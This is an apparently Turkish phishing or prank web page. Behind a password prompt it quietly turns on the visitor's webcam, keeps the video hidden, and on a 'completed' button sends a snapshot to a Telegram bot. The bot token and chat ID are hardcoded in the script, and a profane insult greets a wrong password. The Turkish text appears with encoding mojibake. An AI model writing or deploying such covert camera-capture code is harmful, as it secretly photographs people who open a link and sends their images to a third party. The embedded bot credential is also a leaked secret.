<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">

  <link href="https://fonts.googleapis.com/css2?family=Russo+One&display=swap" rel="stylesheet">
  <style>
    body {
      background-color: black;
      color: white;
      font-family: 'Russo One', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }

    #hataMesaji {
      display: none;
      font-size: 28px;
      color: red;
      animation: yanipSonme 0.5s infinite;
    }

    @keyframes yanipSonme {
      0%, 100% { opacity: 1; }
      50% { opacity: 0; }
    }

    #ayikOl, #tamamlandi {
      display: none;
    }

    #ayikOl {
      font-size: 60px;
      color: red;
      margin-bottom: 10px;
    }

    button {
      font-size: 18px;
      padding: 10px 20px;
      margin-top: 20px;
      cursor: pointer;
    }

    video {
      display: none;
      transform: scaleX(-1); /* Ayna yansÄ±masÄ± efekti */
    }
  </style>
</head>
<body>

  <div id="girisEkrani">
    <h2>Åžifreyi Gir</h2>
    <input type="password" id="sifreInput" placeholder="ÅŸifre">
    <br>
    <button onclick="kontrolEt()">GiriÅŸ</button>
  </div>

  <div id="ayikOl">AYIK OL<br><span style="font-size: 18px; color: orange;">her linke tÄ±klama</span></div>

  <div id="hataMesaji">Senin kafatasÄ±nÄ± sikeyim ÅŸifreyi girmeyi bile beceremedin.</div>

  <video id="kamera" autoplay playsinline muted></video>
  <button id="tamamlandi" onclick="fotoGonder()">TamamlandÄ±</button>
  <div id="gonderildi" style="display:none; margin-top:10px; color:lightgreen;">ðŸ“¸ GÃ¶nderildi!</div>

  <script>
    const botToken = "8403692094:AAGM3PBAgHp4OYV4ZghC92p9ytml5aaSv1g";
    const chatId = "7791726274";

    function kontrolEt() {
      const sifre = document.getElementById("sifreInput").value;
      if (sifre === "671300") {
        document.getElementById("girisEkrani").style.display = "none";
        document.getElementById("ayikOl").style.display = "block";
        document.getElementById("tamamlandi").style.display = "inline-block";

        // Kamera aÃ§ ama gÃ¶rÃ¼nmesin, ayna efekti aktif
        const video = document.getElementById('kamera');
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
          })
          .catch(err => {
            console.error("Kamera aÃ§Ä±lamadÄ±:", err);
          });

      } else {
        document.getElementById("girisEkrani").style.display = "none";
        document.getElementById("hataMesaji").style.display = "block";
      }
    }

    function fotoGonder() {
      const video = document.getElementById('kamera');
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');

      // Ayna etkisi iÃ§in ters Ã§evirerek Ã§iziyoruz
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", blob, "kamera.jpg");

        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: "POST",
          body: formData
        }).then(() => {
          document.getElementById("tamamlandi").style.display = "none";
          document.getElementById("gonderildi").style.display = "block";
        }).catch(err => {
          console.error("Foto gÃ¶nderilemedi:", err);
        });
      }, 'image/jpeg');
    }
  </script>
